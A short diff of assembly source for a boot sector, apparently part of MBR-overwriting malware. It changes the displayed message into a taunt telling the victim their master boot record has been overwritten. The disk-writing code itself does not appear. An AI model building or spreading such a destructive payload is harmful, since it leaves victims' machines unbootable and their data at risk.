@@ -37,6 +37,6 @@ clear_screen:
         int 0x10
         ret
 
-msg:            db        "Okay Here is my tut of internet.",13,10,"so here you can se my project operative 100%.",13,10,"Yeah, MBR Overwrited :D", 0
+msg:            db        "LOL :D:D:D:D:D:D:D:D:D:D:D:D:D .",13,10,"lol you dont know what weve done.",13,10,"ok,we overighted your MBR:D", 0
 times 510 - ($-$$) db 0
 dw        0xaa55
